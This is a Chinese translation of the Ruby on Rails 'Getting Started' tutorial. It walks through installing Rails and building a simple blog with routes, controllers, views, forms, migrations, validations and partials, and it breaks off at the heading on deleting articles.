# vim: set filetype=markdown : 
# Ruby on Rails 指南
日期戳: 25-03-2015

——————————————————————————————————
#  Rails 入门

本文介绍如何开始使用 Ruby on Rails。

读完本文，你将学到：

    如何安装 Rails，新建 Rails 程序，如何连接数据库；
    Rails 程序的基本文件结构；
    MVC（模型，视图，控制器）和 REST 架构的基本原理；
    如何快速生成 Rails 程序骨架；

Chapters

    前提条件
    Rails 是什么？
    新建 Rails 程序
        安装 Rails
        创建 Blog 程序
    Hello, Rails!
        启动服务器
        显示“Hello, Rails!”
        设置程序的首页
    开始使用
        挖地基
        首个表单
        创建文章
        创建 Article 模型
        运行迁移
        在控制器中保存数据
        显示文章
        列出所有文章
        添加链接
        添加数据验证
        更新文章
        使用局部视图去掉视图中的重复代码
        删除文章
    添加第二个模型
        生成模型
        模型关联
        添加评论的路由
        生成控制器
    重构
        渲染局部视图中的集合
        渲染局部视图中的表单
    删除评论
        删除关联对象
    安全
        基本认证
        其他安全注意事项
    接下来做什么
    常见问题

##  1 前提条件

本文针对想从零开始开发 Rails 程序的初学者，不需要预先具备任何的 Rails 使用经验。不过，为了能顺利阅读，还是需要事先安装好一些软件：

    Ruby 1.9.3 及以上版本
    包管理工具 RubyGems，随 Ruby 1.9+ 安装。想深入了解 RubyGems，请阅读 RubyGems 指南
    SQLite3 数据库

Rails 是使用 Ruby 语言开发的网页程序框架。如果之前没接触过 Ruby，学习 Rails 可要深下一番功夫。网上有很多资源可以学习 Ruby：

    Ruby 语言官方网站
    reSRC 列出的免费编程书籍

记住，某些资源虽然很好，但是针对 Ruby 1.8，甚至 1.6 编写的，所以没有介绍一些 Rails 日常开发会用到的句法。

##  2 Rails 是什么？

Rails 是使用 Ruby 语言编写的网页程序开发框架，目的是为开发者提供常用组件，简化网页程序的开发。只需编写较少的代码，就能实现其他编程语言或框架难以企及的功能。经验丰富的 Rails 程序员会发现，Rails 让程序开发变得更有乐趣。

Rails 有自己的一套规则，认为问题总有最好的解决方法，而且建议使用最好的方法，有些情况下甚至不推荐使用其他替代方案。学会如何按照 Rails 的思维开发，能极大提高开发效率。如果坚持在 Rails 开发中使用其他语言中的旧思想，尝试使用别处学来的编程模式，开发过程就不那么有趣了。

Rails 哲学包含两大指导思想：

    不要自我重复（DRY）： DRY 是软件开发中的一个原则，“系统中的每个功能都要具有单一、准确、可信的实现。”。不重复表述同一件事，写出的代码才能更易维护，更具扩展性，也更不容易出问题。
    多约定，少配置： Rails 为网页程序的大多数需求都提供了最好的解决方法，而且默认使用这些约定，不用在长长的配置文件中设置每个细节。

##  3 新建 Rails 程序

阅读本文时，最好跟着一步一步操作，如果错过某段代码或某个步骤，程序就可能出错，所以请一步一步跟着做。完整的源码可以在这里获取。

本文会新建一个名为 blog 的 Rails 程序，这是一个非常简单的博客。在开始开发程序之前，要确保已经安装了 Rails。

文中的示例代码使用 $ 表示命令行提示符，你的提示符可能修改过，所以会不一样。在 Windows 中，提示符可能是 c:\source_code>。

###  3.1 安装 Rails

打开命令行：在 Mac OS X 中打开 Terminal.app，在 Windows 中选择“运行”，然后输入“cmd.exe”。下文中所有以 $ 开头的代码，都要在命令行中运行。先确认是否安装了 Ruby 最新版：

有很多工具可以帮助你快速在系统中安装 Ruby 和 Ruby on Rails。Windows 用户可以使用 Rails Installer，Mac OS X 用户可以使用 Tokaido。
$ ruby -v
ruby 2.1.2p95

如果你还没安装 Ruby，请访问 ruby-lang.org，找到针对所用系统的安装方法。

很多类 Unix 系统都自带了版本尚新的 SQLite3。Windows 等其他操作系统的用户可以在 SQLite3 的网站上找到安装说明。然后，确认是否在 PATH 中：
$ sqlite3 --version

命令行应该回显版本才对。

安装 Rails，请使用 RubyGems 提供的 gem install 命令：
$ gem install rails

要检查所有软件是否都正确安装了，可以执行下面的命令：
$ rails --version

如果显示的结果类似“Rails 4.2.0”，那么就可以继续往下读了。
####  3.2 创建 Blog 程序

Rails 提供了多个被称为“生成器”的脚本，可以简化开发，生成某项操作需要的所有文件。其中一个是新程序生成器，生成一个 Rails 程序骨架，不用自己一个一个新建文件。

打开终端，进入有写权限的文件夹，执行以下命令生成一个新程序：
$ rails new blog

这个命令会在文件夹 blog 中新建一个 Rails 程序，然后执行 bundle install 命令安装 Gemfile 中列出的 gem。

执行 rails new -h 可以查看新程序生成器的所有命令行选项。

生成 blog 程序后，进入该文件夹：
$ cd blog

blog 文件夹中有很多自动生成的文件和文件夹，组成一个 Rails 程序。本文大部分时间都花在 app 文件夹上。下面简单介绍默认生成的文件和文件夹的作用：
文件/文件夹 	作用
app/ 	存放程序的控制器、模型、视图、帮助方法、邮件和静态资源文件。本文主要关注的是这个文件夹。
bin/ 	存放运行程序的 rails 脚本，以及其他用来部署或运行程序的脚本。
config/ 	设置程序的路由，数据库等。详情参阅“设置 Rails 程序”一文。
config.ru 	基于 Rack 服务器的程序设置，用来启动程序。
db/ 	存放当前数据库的模式，以及数据库迁移文件。
Gemfile, Gemfile.lock 	这两个文件用来指定程序所需的 gem 依赖件，用于 Bundler gem。关于 Bundler 的详细介绍，请访问 Bundler 官网。
lib/ 	程序的扩展模块。
log/ 	程序的日志文件。
public/ 	唯一对外开放的文件夹，存放静态文件和编译后的资源文件。
Rakefile 	保存并加载可在命令行中执行的任务。任务在 Rails 的各组件中定义。如果想添加自己的任务，不要修改这个文件，把任务保存在 lib/tasks 文件夹中。
README.rdoc 	程序的简单说明。你应该修改这个文件，告诉其他人这个程序的作用，如何安装等。
test/ 	单元测试，固件等测试用文件。详情参阅“测试 Rails 程序”一文。
tmp/ 	临时文件，例如缓存，PID，会话文件。
vendor/ 	存放第三方代码。经常用来放第三方 gem。


##  4 Hello, Rails!

首先，我们来添加一些文字，在页面中显示。为了能访问网页，要启动程序服务器。

### 4.1 启动服务器

现在，新建的 Rails 程序已经可以正常运行。要访问网站，需要在开发电脑上启动服务器。请在 blog 文件夹中执行下面的命令：
$ rails server

把 CoffeeScript 编译成 JavaScript 需要 JavaScript 运行时，如果没有运行时，会报错，提示没有 execjs。Mac OS X 和 Windows 一般都提供了 JavaScript 运行时。Rails 生成的 Gemfile 中，安装 therubyracer gem 的代码被注释掉了，如果需要使用这个 gem，请把前面的注释去掉。在 JRuby 中推荐使用 therubyracer。在 JRuby 中生成的 Gemfile 已经包含了这个 gem。所有支持的运行时参见 ExecJS。

上述命令会启动 WEBrick，这是 Ruby 内置的服务器。要查看程序，请打开一个浏览器窗口，访问 http://localhost:3000。应该会看到默认的 Rails 信息页面：

欢迎使用页面

要想停止服务器，请在命令行中按 Ctrl+C 键。服务器成功停止后回重新看到命令行提示符。在大多数类 Unix 系统中，包括 Mac OS X，命令行提示符是 $ 符号。在开发模式中，一般情况下无需重启服务器，修改文件后，服务器会自动重新加载。

“欢迎使用”页面是新建 Rails 程序后的“冒烟测试”：确保程序设置正确，能顺利运行。你可以点击“About your application's environment”链接查看程序所处环境的信息。
###  4.2 显示“Hello, Rails!”

要在 Rails 中显示“Hello, Rails!”，需要新建一个控制器和视图。

控制器用来接受向程序发起的请求。路由决定哪个控制器会接受到这个请求。一般情况下，每个控制器都有多个路由，对应不同的动作。动作用来提供视图中需要的数据。

视图的作用是，以人类能看懂的格式显示数据。有一点要特别注意，数据是在控制器中获取的，而不是在视图中。视图只是把数据显示出来。默认情况下，视图使用 eRuby（嵌入式 Ruby）语言编写，经由 Rails 解析后，再发送给用户。

控制器可用控制器生成器创建，你要告诉生成器，我想要个名为“welcome”的控制器和一个名为“index”的动作，如下所示：
$ rails generate controller welcome index

运行上述命令后，Rails 会生成很多文件，以及一个路由。
create  app/controllers/welcome_controller.rb
 route  get 'welcome/index'
invoke  erb
create    app/views/welcome
create    app/views/welcome/index.html.erb
invoke  test_unit
create    test/controllers/welcome_controller_test.rb
invoke  helper
create    app/helpers/welcome_helper.rb
invoke  assets
invoke    coffee
create      app/assets/javascripts/welcome.js.coffee
invoke    scss
create      app/assets/stylesheets/welcome.css.scss

在这些文件中，最重要的当然是控制器，位于 app/controllers/welcome_controller.rb，以及视图，位于 app/views/welcome/index.html.erb。

使用文本编辑器打开 app/views/welcome/index.html.erb 文件，删除全部内容，写入下面这行代码：
<h1>Hello, Rails!</h1>

###  4.3 设置程序的首页

我们已经创建了控制器和视图，现在要告诉 Rails 在哪个地址上显示“Hello, Rails!”。这里，我们希望访问根地址 http://localhost:3000 时显示。但是现在显示的还是欢迎页面。

我们要告诉 Rails 真正的首页是什么。

在编辑器中打开 config/routes.rb 文件。
Rails.application.routes.draw do
  get 'welcome/index'
 
  # The priority is based upon order of creation:
  # first created -> highest priority.
  #
  # You can have the root of your site routed with "root"
  # root 'welcome#index'
  #
  # ...

这是程序的路由文件，使用特殊的 DSL（domain-specific language，领域专属语言）编写，告知 Rails 请求应该发往哪个控制器和动作。文件中有很多注释，举例说明如何定义路由。其中有一行说明了如何指定控制器和动作设置网站的根路由。找到以 root 开头的代码行，去掉注释，变成这样：
root 'welcome#index'

root 'welcome#index' 告知 Rails，访问程序的根路径时，交给 welcome 控制器中的 index 动作处理。get 'welcome/index' 告知 Rails，访问 http://localhost:3000/welcome/index 时，交给 welcome 控制器中的 index 动作处理。get 'welcome/index' 是运行 rails generate controller welcome index 时生成的。

如果生成控制器时停止了服务器，请再次启动（rails server），然后在浏览器中访问 http://localhost:3000。你会看到之前写入 app/views/welcome/index.html.erb 文件的“Hello, Rails!”，说明新定义的路由把根目录交给 WelcomeController 的 index 动作处理了，而且也正确的渲染了视图。

关于路由的详细介绍，请阅读“Rails 路由全解”一文。


##  5 开始使用

前文已经介绍如何创建控制器、动作和视图，下面我们来创建一些更实质的功能。

在博客程序中，我们要创建一个新“资源”。资源是指一系列类似的对象，比如文章，人和动物。

资源可以被创建、读取、更新和删除，这些操作简称 CRUD。

Rails 提供了一个 resources 方法，可以声明一个符合 REST 架构的资源。创建文章资源后，config/routes.rb 文件的内容如下：
Rails.application.routes.draw do
 
  resources :articles
 
  root 'welcome#index'
end

执行 rake routes 任务，会看到定义了所有标准的 REST 动作。输出结果中各列的意义稍后会说明，现在只要留意 article 的单复数形式，这在 Rails 中有特殊的含义。
$ bin/rake routes
      Prefix Verb   URI Pattern                  Controller#Action
    articles GET    /articles(.:format)          articles#index
             POST   /articles(.:format)          articles#create
 new_article GET    /articles/new(.:format)      articles#new
edit_article GET    /articles/:id/edit(.:format) articles#edit
     article GET    /articles/:id(.:format)      articles#show
             PATCH  /articles/:id(.:format)      articles#update
             PUT    /articles/:id(.:format)      articles#update
             DELETE /articles/:id(.:format)      articles#destroy
        root GET    /                            welcome#index

下一节，我们会加入新建文章和查看文章的功能。这两个操作分别对应于 CRUD 的 C 和 R，即创建和读取。新建文章的表单如下所示：

新建文章表单

表单看起来很简陋，不过没关系，后文会加入更多的样式。

###  5.1 挖地基

首先，程序中要有个页面用来新建文章。一个比较好的选择是 /articles/new。这个路由前面已经定义了，可以访问。打开 http://localhost:3000/articles/new ，会看到如下的路由错误：

路由错误，常量 ArticlesController 未初始化

产生这个错误的原因是，没有定义用来处理该请求的控制器。解决这个问题的方法很简单：创建名为 ArticlesController 的控制器。执行下面的命令即可：
$ bin/rails g controller articles

打开刚生成的 app/controllers/articles_controller.rb 文件，会看到一个几乎没什么内容的控制器：
class ArticlesController < ApplicationController
end

控制器就是一个类，继承自 ApplicationController。在这个类中定义的方法就是控制器的动作。动作的作用是处理文章的 CRUD 操作。

在 Ruby 中，方法分为 public、private 和 protected 三种，只有 public 方法才能作为控制器的动作。详情参阅 Programming Ruby 一书。

现在刷新 http://localhost:3000/articles/new，会看到一个新错误：

ArticlesController 控制器不知如何处理 new 动作

这个错误的意思是，在刚生成的 ArticlesController 控制器中找不到 new 动作。因为在生成控制器时，除非指定要哪些动作，否则不会生成，控制器是空的。

手动创建动作只需在控制器中定义一个新方法。打开 app/controllers/articles_controller.rb 文件，在 ArticlesController 类中，定义 new 方法，如下所示：
class ArticlesController < ApplicationController
  def new
  end
end

在 ArticlesController 中定义 new 方法后，再刷新 http://localhost:3000/articles/new，看到的还是个错误：

找不到 articles/new 所用模板

产生这个错误的原因是，Rails 希望这样的常规动作有对应的视图，用来显示内容。没有视图可用，Rails 就报错了。

在上图中，最后一行被截断了，我们来看一下完整的信息：
Missing template articles/new, application/new with {locale:[:en], formats:[:html], handlers:[:erb, :builder, :coffee]}. Searched in: * "/path/to/blog/app/views"

这行信息还挺长，我们来看一下到底是什么意思。

第一部分说明找不到哪个模板，这里，丢失的是 articles/new 模板。Rails 首先会寻找这个模板，如果找不到，再找名为 application/new 的模板。之所以这么找，是因为 ArticlesController 继承自 ApplicationController。

后面一部分是个 Hash。:locale 表示要找哪国语言模板，默认是英语（"en"）。:format 表示响应使用的模板格式，默认为 :html，所以 Rails 要寻找一个 HTML 模板。:handlers 表示用来处理模板的程序，HTML 模板一般使用 :erb，XML 模板使用 :builder，:coffee 用来把 CoffeeScript 转换成 JavaScript。

最后一部分说明 Rails 在哪里寻找模板。在这个简单的程序里，模板都存放在一个地方，复杂的程序可能存放在多个位置。

让这个程序正常运行，最简单的一种模板是 app/views/articles/new.html.erb。模板文件的扩展名是关键所在：第一个扩展名是模板的类型，第二个扩展名是模板的处理程序。Rails 会尝试在 app/views 文件夹中寻找名为 articles/new 的模板。这个模板的类型只能是 html，处理程序可以是 erb、builder 或 coffee。因为我们要编写一个 HTML 表单，所以使用 erb。所以这个模板文件应该命名为 articles/new.html.erb，还要放在 app/views 文件夹中。

新建文件 app/views/articles/new.html.erb，写入如下代码：
<h1>New Article</h1>

再次刷新 http://localhost:3000/articles/new，可以看到页面中显示了一个标头。现在路由、控制器、动作和视图都能正常运行了。接下来要编写新建文章的表单了。
###  5.2 首个表单

要在模板中编写表单，可以使用“表单构造器”。Rails 中常用的表单构造器是 form_for。在 app/views/articles/new.html.erb 文件中加入以下代码：
<%= form_for :article do |f| %>
  <p>
    <%= f.label :title %><br>
    <%= f.text_field :title %>
  </p>
 
  <p>
    <%= f.label :text %><br>
    <%= f.text_area :text %>
  </p>
 
  <p>
    <%= f.submit %>
  </p>
<% end %>

现在刷新页面，会看到上述代码生成的表单。在 Rails 中编写表单就是这么简单！

调用 form_for 方法时，要指定一个对象。在上面的表单中，指定的是 :article。这个对象告诉 form_for，这个表单是用来处理哪个资源的。在 form_for 方法的块中，FormBuilder 对象（用 f 表示）创建了两个标签和两个文本字段，一个用于文章标题，一个用于文章内容。最后，在 f 对象上调用 submit 方法，创建一个提交按钮。

不过这个表单还有个问题。如果查看这个页面的源码，会发现表单 action 属性的值是 /articles/new。这就是问题所在，因为其指向的地址就是现在这个页面，而这个页面是用来显示新建文章表单的。

要想转到其他地址，就要使用其他的地址。这个问题可使用 form_for 方法的 :url 选项解决。在 Rails 中，用来处理新建资源表单提交数据的动作是 create，所以表单应该转向这个动作。

修改 app/views/articles/new.html.erb 文件中的 form_for，改成这样：
<%= form_for :article, url: articles_path do |f| %>

这里，我们把 :url 选项的值设为 articles_path 帮助方法。要想知道这个方法有什么作用，我们要回过头再看一下 rake routes 的输出：
$ bin/rake routes
      Prefix Verb   URI Pattern                  Controller#Action
    articles GET    /articles(.:format)          articles#index
             POST   /articles(.:format)          articles#create
 new_article GET    /articles/new(.:format)      articles#new
edit_article GET    /articles/:id/edit(.:format) articles#edit
     article GET    /articles/:id(.:format)      articles#show
             PATCH  /articles/:id(.:format)      articles#update
             PUT    /articles/:id(.:format)      articles#update
             DELETE /articles/:id(.:format)      articles#destroy
        root GET    /                            welcome#index

articles_path 帮助方法告诉 Rails，对应的地址是 /articles，默认情况下，这个表单会向这个路由发起 POST 请求。这个路由对应于 ArticlesController 控制器的 create 动作。

表单写好了，路由也定义了，现在可以填写表单，然后点击提交按钮新建文章了。请实际操作一下。提交表单后，会看到一个熟悉的错误：

ArticlesController 控制器不知如何处理 create 动作

解决这个错误，要在 ArticlesController 控制器中定义 create 动作。

###  5.3 创建文章

要解决前一节出现的错误，可以在 ArticlesController 类中定义 create 方法。在 app/controllers/articles_controller.rb 文件中 new 方法后面添加以下代码：
class ArticlesController < ApplicationController
  def new
  end
 
  def create
  end
end

然后再次提交表单，会看到另一个熟悉的错误：找不到模板。现在暂且不管这个错误。create 动作的作用是把新文章保存到数据库中。

提交表单后，其中的字段以参数的形式传递给 Rails。这些参数可以在控制器的动作中使用，完成指定的操作。要想查看这些参数的内容，可以把 create 动作改成：
def create
  render plain: params[:article].inspect
end

render 方法接受一个简单的 Hash 为参数，这个 Hash 的键是 plain，对应的值为 params[:article].inspect。params 方法表示通过表单提交的参数，返回 ActiveSupport::HashWithIndifferentAccess 对象，可以使用字符串或者 Symbol 获取键对应的值。现在，我们只关注通过表单提交的参数。

如果现在再次提交表单，不会再看到找不到模板错误，而是会看到类似下面的文字：
{"title"=>"First article!", "text"=>"This is my first article."}

create 动作把表单提交的参数显示出来了。不过这么做没什么用，看到了参数又怎样，什么都没发生。
###  5.4 创建 Article 模型

在 Rails 中，模型的名字使用单数，对应的数据表名使用复数。Rails 提供了一个生成器用来创建模型，大多数 Rails 开发者创建模型时都会使用。创建模型，请在终端里执行下面的命令：
$ bin/rails generate model Article title:string text:text

这个命令告知 Rails，我们要创建 Article 模型，以及一个字符串属性 title 和文本属性 text。这两个属性会自动添加到 articles 数据表中，映射到 Article 模型。

执行这个命令后，Rails 会生成一堆文件。现在我们只关注 app/models/article.rb 和 db/migrate/20140120191729_create_articles.rb（你得到的文件名可能有点不一样）这两个文件。后者用来创建数据库结构，下一节会详细说明。

Active Record 很智能，能自动把数据表中的字段映射到模型的属性上。所以无需在 Rails 的模型中声明属性，因为 Active Record 会自动映射。

###  5.5 运行迁移

如前文所述，rails generate model 命令会在 db/migrate 文件夹中生成一个数据库迁移文件。迁移是一个 Ruby 类，能简化创建和修改数据库结构的操作。Rails 使用 rake 任务运行迁移，修改数据库结构后还能撤销操作。迁移的文件名中有个时间戳，这样能保证迁移按照创建的时间顺序运行。

db/migrate/20140120191729_create_articles.rb（还记得吗，你的迁移文件名可能有点不一样）文件的内容如下所示：
class CreateArticles < ActiveRecord::Migration
  def change
    create_table :articles do |t|
      t.string :title
      t.text :text
 
      t.timestamps
    end
  end
end

在这个迁移中定义了一个名为 change 的方法，在运行迁移时执行。change 方法中定义的操作都是可逆的，Rails 知道如何撤销这次迁移操作。运行迁移后，会创建 articles 表，以及一个字符串字段和文本字段。同时还会创建两个时间戳字段，用来跟踪记录的创建时间和更新时间。

关于迁移的详细说明，请参阅“Active Record 数据库迁移”一文。

然后，使用 rake 命令运行迁移：
$ bin/rake db:migrate

Rails 会执行迁移操作，告诉你创建了 articles 表。
==  CreateArticles: migrating ==================================================
-- create_table(:articles)
   -> 0.0019s
==  CreateArticles: migrated (0.0020s) =========================================

因为默认情况下，程序运行在开发环境中，所以相关的操作应用于 config/database.yml 文件中 development 区域设置的数据库上。如果想在其他环境中运行迁移，必须在命令中指明：rake db:migrate RAILS_ENV=production。

###  5.6 在控制器中保存数据

再回到 ArticlesController 控制器，我们要修改 create 动作，使用 Article 模型把数据保存到数据库中。打开 app/controllers/articles_controller.rb 文件，把 create 动作修改成这样：
def create
  @article = Article.new(params[:article])
 
  @article.save
  redirect_to @article
end

在 Rails 中，每个模型可以使用各自的属性初始化，自动映射到数据库字段上。create 动作中的第一行就是这个目的（还记得吗，params[:article] 就是我们要获取的属性）。@article.save 的作用是把模型保存到数据库中。保存完后转向 show 动作。稍后再编写 show 动作。

后文会看到，@article.save 返回一个布尔值，表示保存是否成功。

再次访问 http://localhost:3000/articles/new，填写表单，还差一步就能创建文章了，会看到一个错误页面：

新建文章时禁止使用属性

Rails 提供了很多安全防范措施保证程序的安全，你所看到的错误就是因为违反了其中一个措施。这个防范措施叫做“健壮参数”，我们要明确地告知 Rails 哪些参数可在控制器中使用。这里，我们想使用 title 和 text 参数。请把 create 动作修成成：
def create
  @article = Article.new(article_params)
 
  @article.save
  redirect_to @article
end
 
private
  def article_params
    params.require(:article).permit(:title, :text)
  end

看到 permit 方法了吗？这个方法允许在动作中使用 title 和 text 属性。

注意，article_params 是私有方法。这种用法可以防止攻击者把修改后的属性传递给模型。关于健壮参数的更多介绍，请阅读这篇文章。

###  5.7 显示文章

现在再次提交表单，Rails 会提示找不到 show 动作。这个提示没多大用，我们还是先添加 show 动作吧。

我们在 rake routes 的输出中看到，show 动作的路由是：
article GET    /articles/:id(.:format)      articles#show

:id 的意思是，路由期望接收一个名为 id 的参数，在这个例子中，就是文章的 ID。

和前面一样，我们要在 app/controllers/articles_controller.rb 文件中添加 show 动作，以及相应的视图文件。
def show
  @article = Article.find(params[:id])
end

有几点要注意。我们调用 Article.find 方法查找想查看的文章，传入的参数 params[:id] 会从请求中获取 :id 参数。我们还把文章对象存储在一个实例变量中（以 @ 开头的变量），只有这样，变量才能在视图中使用。

然后，新建 app/views/articles/show.html.erb 文件，写入下面的代码：

<p>
  <strong>Title:</strong>
  <%= @article.title %>
</p>
 
<p>
  <strong>Text:</strong>
  <%= @article.text %>
</p>

做了以上修改后，就能真正的新建文章了。访问 http://localhost:3000/articles/new，自己试试。

显示文章

###  5.8 列出所有文章

我们还要列出所有文章，对应的路由是：
articles GET    /articles(.:format)          articles#index

在 app/controllers/articles_controller.rb 文件中，为 ArticlesController 控制器添加 index 动作：
def index
  @articles = Article.all
end

然后编写这个动作的视图，保存为 app/views/articles/index.html.erb：
<h1>Listing articles</h1>
 
<table>
  <tr>
    <th>Title</th>
    <th>Text</th>
  </tr>
 
  <% @articles.each do |article| %>
    <tr>
      <td><%= article.title %></td>
      <td><%= article.text %></td>
    </tr>
  <% end %>
</table>

现在访问 http://localhost:3000/articles，会看到已经发布的文章列表。

###  5.9 添加链接

至此，我们可以新建、显示、列出文章了。下面我们添加一些链接，指向这些页面。

打开 app/views/welcome/index.html.erb 文件，改成这样：
<h1>Hello, Rails!</h1>
<%= link_to 'My Blog', controller: 'articles' %>

link_to 是 Rails 内置的视图帮助方法之一，根据提供的文本和地址创建超链接。这上面这段代码中，地址是文章列表页面。

接下来添加到其他页面的链接。先在 app/views/articles/index.html.erb 中添加“New Article”链接，放在 <table> 标签之前：
<%= link_to 'New article', new_article_path %>

点击这个链接后，会转向新建文章的表单页面。

然后在 app/views/articles/new.html.erb 中添加一个链接，位于表单下面，返回到 index 动作：
<%= form_for :article do |f| %>
  ...
<% end %>
 
<%= link_to 'Back', articles_path %>

最后，在 app/views/articles/show.html.erb 模板中添加一个链接，返回 index 动作，这样用户查看某篇文章后就可以返回文章列表页面了：
<p>
  <strong>Title:</strong>
  <%= @article.title %>
</p>
 
<p>
  <strong>Text:</strong>
  <%= @article.text %>
</p>
 
<%= link_to 'Back', articles_path %>

如果要链接到同一个控制器中的动作，不用指定 :controller 选项，因为默认情况下使用的就是当前控制器。

在开发模式下（默认），每次请求 Rails 都会重新加载程序，因此修改之后无需重启服务器。

###  5.10 添加数据验证

模型文件，比如 app/models/article.rb，可以简单到只有这两行代码：
class Article < ActiveRecord::Base
end

文件中没有多少代码，不过请注意，Article 类继承自 ActiveRecord::Base。Active Record 提供了很多功能，包括：基本的数据库 CRUD 操作，数据验证，复杂的搜索功能，以及多个模型之间的关联。

Rails 为模型提供了很多方法，用来验证传入的数据。打开 app/models/article.rb 文件，修改成：
class Article < ActiveRecord::Base
  validates :title, presence: true,
                    length: { minimum: 5 }
end

添加的这段代码可以确保每篇文章都有一个标题，而且至少有五个字符。在模型中可以验证数据是否满足多种条件，包括：字段是否存在、是否唯一，数据类型，以及关联对象是否存在。“Active Record 数据验证”一文会详细介绍数据验证。

添加数据验证后，如果把不满足验证条件的文章传递给 @article.save，会返回 false。打开 app/controllers/articles_controller.rb 文件，会发现，我们还没在 create 动作中检查 @article.save 的返回结果。如果保存失败，应该再次显示表单。为了实现这种功能，请打开 app/controllers/articles_controller.rb 文件，把 new 和 create 动作改成：
def new
  @article = Article.new
end
 
def create
  @article = Article.new(article_params)
 
  if @article.save
    redirect_to @article
  else
    render 'new'
  end
end
 
private
  def article_params
    params.require(:article).permit(:title, :text)
  end

在 new 动作中添加了一个实例变量 @article。稍后你会知道为什么要这么做。

注意，在 create 动作中，如果保存失败，调用的是 render 方法而不是 redirect_to 方法。用 render 方法才能在保存失败后把 @article 对象传给 new 动作的视图。渲染操作和表单提交在同一次请求中完成；而 redirect_to 会让浏览器发起一次新请求。

刷新 http://localhost:3000/articles/new，提交一个没有标题的文章，Rails 会退回这个页面，但这种处理方法没多少用，你要告诉用户哪儿出错了。为了实现这种功能，请在 app/views/articles/new.html.erb 文件中检测错误消息：
<%= form_for :article, url: articles_path do |f| %>
  <% if @article.errors.any? %>
  <div id="error_explanation">
    <h2><%= pluralize(@article.errors.count, "error") %> prohibited
      this article from being saved:</h2>
    <ul>
    <% @article.errors.full_messages.each do |msg| %>
      <li><%= msg %></li>
    <% end %>
    </ul>
  </div>
  <% end %>
  <p>
    <%= f.label :title %><br>
    <%= f.text_field :title %>
  </p>
 
  <p>
    <%= f.label :text %><br>
    <%= f.text_area :text %>
  </p>
 
  <p>
    <%= f.submit %>
  </p>
<% end %>
 
<%= link_to 'Back', articles_path %>

我们添加了很多代码，使用 @article.errors.any? 检查是否有错误，如果有错误，使用 @article.errors.full_messages 显示错误。

pluralize 是 Rails 提供的帮助方法，接受一个数字和字符串作为参数。如果数字比 1 大，字符串会被转换成复数形式。

在 new 动作中加入 @article = Article.new 的原因是，如果不这么做，在视图中 @article 的值就是 nil，调用 @article.errors.any? 时会发生错误。

Rails 会自动把出错的表单字段包含在一个 div 中，并为其添加了一个 class：field_with_errors。我们可以定义一些样式，凸显出错的字段。

再次访问 http://localhost:3000/articles/new，尝试发布一篇没有标题的文章，会看到一个很有用的错误提示。

出错的表单

###  5.11 更新文章

我们已经说明了 CRUD 中的 CR 两种操作。下面进入 U 部分，更新文章。

首先，要在 ArticlesController 中添加 edit 动作：
def edit
  @article = Article.find(params[:id])
end

视图中要添加一个类似新建文章的表单。新建 app/views/articles/edit.html.erb 文件，写入下面的代码：
<h1>Editing article</h1>
 
<%= form_for :article, url: article_path(@article), method: :patch do |f| %>
  <% if @article.errors.any? %>
  <div id="error_explanation">
    <h2><%= pluralize(@article.errors.count, "error") %> prohibited
      this article from being saved:</h2>
    <ul>
    <% @article.errors.full_messages.each do |msg| %>
      <li><%= msg %></li>
    <% end %>
    </ul>
  </div>
  <% end %>
  <p>
    <%= f.label :title %><br>
    <%= f.text_field :title %>
  </p>
 
  <p>
    <%= f.label :text %><br>
    <%= f.text_area :text %>
  </p>
 
  <p>
    <%= f.submit %>
  </p>
<% end %>
 
<%= link_to 'Back', articles_path %>

这里的表单指向 update 动作，现在还没定义，稍后会添加。

method: :patch 选项告诉 Rails，提交这个表单时使用 PATCH 方法发送请求。根据 REST 架构，更新资源时要使用 HTTP PATCH 方法。

form_for 的第一个参数可以是对象，例如 @article，把对象中的字段填入表单。如果传入一个和实例变量（@article）同名的 Symbol（:article），效果也是一样。上面的代码使用的就是 Symbol。详情参见 form_for 的文档。

然后，要在 app/controllers/articles_controller.rb 中添加 update 动作：
def update
  @article = Article.find(params[:id])
 
  if @article.update(article_params)
    redirect_to @article
  else
    render 'edit'
  end
end
 
private
  def article_params
    params.require(:article).permit(:title, :text)
  end

新定义的 update 方法用来处理对现有文章的更新操作，接收一个 Hash，包含想要修改的属性。和之前一样，如果更新文章出错了，要再次显示表单。

上面的代码再次使用了前面为 create 动作定义的 article_params 方法。

不用把所有的属性都提供给 update 动作。例如，如果使用 @article.update(title: 'A new title')，Rails 只会更新 title 属性，不修改其他属性。

最后，我们想在文章列表页面，在每篇文章后面都加上一个链接，指向 edit 动作。打开 app/views/articles/index.html.erb 文件，在“Show”链接后面添加“Edit”链接：
<table>
  <tr>
    <th>Title</th>
    <th>Text</th>
    <th colspan="2"></th>
  </tr>
 
<% @articles.each do |article| %>
  <tr>
    <td><%= article.title %></td>
    <td><%= article.text %></td>
    <td><%= link_to 'Show', article_path(article) %></td>
    <td><%= link_to 'Edit', edit_article_path(article) %></td>
  </tr>
<% end %>
</table>

我们还要在 app/views/articles/show.html.erb 模板的底部加上“Edit”链接：
...
 
<%= link_to 'Back', articles_path %>
| <%= link_to 'Edit', edit_article_path(@article) %>

下图是文章列表页面现在的样子：

在文章列表页面显示了编辑链接

###  5.12 使用局部视图去掉视图中的重复代码

编辑文章页面和新建文章页面很相似，显示表单的代码是相同的。下面使用局部视图去掉两个视图中的重复代码。按照约定，局部视图的文件名以下划线开头。

关于局部视图的详细介绍参阅“Layouts and Rendering in Rails”一文。

新建 app/views/articles/_form.html.erb 文件，写入以下代码：
<%= form_for @article do |f| %>
  <% if @article.errors.any? %>
  <div id="error_explanation">
    <h2><%= pluralize(@article.errors.count, "error") %> prohibited
      this article from being saved:</h2>
    <ul>
    <% @article.errors.full_messages.each do |msg| %>
      <li><%= msg %></li>
    <% end %>
    </ul>
  </div>
  <% end %>
  <p>
    <%= f.label :title %><br>
    <%= f.text_field :title %>
  </p>
 
  <p>
    <%= f.label :text %><br>
    <%= f.text_area :text %>
  </p>
 
  <p>
    <%= f.submit %>
  </p>
<% end %>

除了第一行 form_for 的用法变了之外，其他代码都和之前一样。之所以能在两个动作中共用一个 form_for，是因为 @article 是一个资源，对应于符合 REST 架构的路由，Rails 能自动分辨使用哪个地址和请求方法。

关于这种 form_for 用法的详细说明，请查阅 API 文档。

下面来修改 app/views/articles/new.html.erb 视图，使用新建的局部视图，把其中的代码全删掉，替换成：
<h1>New article</h1>
 
<%= render 'form' %>
 
<%= link_to 'Back', articles_path %>

然后按照同样地方法修改 app/views/articles/edit.html.erb 视图：
<h1>Edit article</h1>
 
<%= render 'form' %>
 
<%= link_to 'Back', articles_path %>

###  5.13 删除文章

